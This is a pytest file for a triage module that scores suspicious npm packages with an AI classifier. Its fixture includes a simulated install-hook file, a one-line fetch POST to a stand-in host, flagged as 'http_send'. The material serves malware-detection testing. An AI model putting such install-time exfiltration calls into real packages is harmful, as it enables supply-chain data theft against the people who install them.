from secopsai import clef_triage


class _Response:
    def __init__(self, payload):
        self.payload = payload

    status_code = 200
    headers = {}

    def raise_for_status(self):
        pass

    def json(self):
        return self.payload


class _Session:
    def __init__(self, payload):
        self.payload, self.sent = payload, None

    def post(self, url, **kwargs):
        self.sent = {"url": url, **kwargs}
        return _Response(self.payload)


CONTEXT = {"ecosystem": "npm", "package": "x", "version": "1.0.0", "rule_score": 80, "rule_level": "alert",
           "metadata_signals": [{"id": "behaviours", "flags": ["install_hook", "http_send"]}],
           "install_time_files": [{"path": "package/i.js", "content": "fetch('https://e.example/c',{method:'POST'})"}],
           "findings": [{"rule_id": "BEHAVIOUR:BEH_X", "file_path": "package/i.js", "matched_indicator": "behaviour: http_send", "safe_context": "fetch(...)"}]}


def test_state_puts_install_files_first_and_is_capped():
    state = clef_triage.build_state(CONTEXT)
    import json
    body = json.loads(state)
    assert body['evidence']['install_time_files'][0]['path'] == 'package/i.js'
    assert body['evidence']['metadata_signals'][0]['flags'] == ['install_hook', 'http_send']
    state = clef_triage.build_state({**CONTEXT, "install_time_files": [{"path": "a", "content": "z" * 100000}]})
    assert len(state) <= clef_triage.MAX_STATE_CHARS
    assert json.loads(state)['coverage']['complete'] is False
    assert 'fetch(...)' in state



def test_classify_reads_workers_ai_answers():
    payload = {"success": True, "result": {"model": "clef", "usage": {"input_tokens": 812, "output_tokens": 0}, "answers": {
        "malicious": {"type": "noul", "noul": 0.87},
        "disposition": {"type": "choice", "choice": "malicious", "probabilities": {"malicious": 0.8, "benign": 0.05, "needs_review": 0.15}, "confidence": 0.7}}}}
    session = _Session(payload)
    result = clef_triage.classify(CONTEXT, account_id="acct", api_token="tok", session=session)
    assert {key: result[key] for key in ("probability", "choice", "choice_probabilities", "input_tokens", "model")} == {"probability": 87, "choice": "malicious", "choice_probabilities": {"malicious": 0.8, "benign": 0.05, "needs_review": 0.15},
                      "input_tokens": 812, "model": "clef"}
    assert session.sent["url"].endswith("/accounts/acct/ai/run/@cf/cloudflare/clef")
    assert set(session.sent["json"]["questions"]) == {"malicious", "disposition"}


def test_failed_response_cannot_become_zero_probability():
    import pytest
    from secopsai.decision_contracts import DecisionError
    for payload in ({'success': False, 'errors': []}, {'success': True, 'result': {'answers': {}}}):
        with pytest.raises(DecisionError):
            clef_triage.classify(CONTEXT, account_id='acct', api_token='tok', session=_Session(payload))


def test_budget_preserves_matches_after_large_install_file():
    import json
    state = clef_triage.build_state({**CONTEXT, 'install_time_files': [{'path': 'large', 'content': 'x' * 100000}],
        'findings': [{'rule_id': 'R', 'file_path': 'payload.js', 'matched_strings': ['DECISIVE_TEXT']}],
        'flagged_files': [{'path': 'payload.js', 'content': 'DECISIVE_TEXT'}]})
    assert 'DECISIVE_TEXT' in state
    assert not json.loads(state)['coverage']['complete']
    assert 'matched_strings' in json.loads(state)['evidence']
    assert json.loads(state)['evidence']['matched_strings'][0]['matched_strings'] == ['DECISIVE_TEXT']
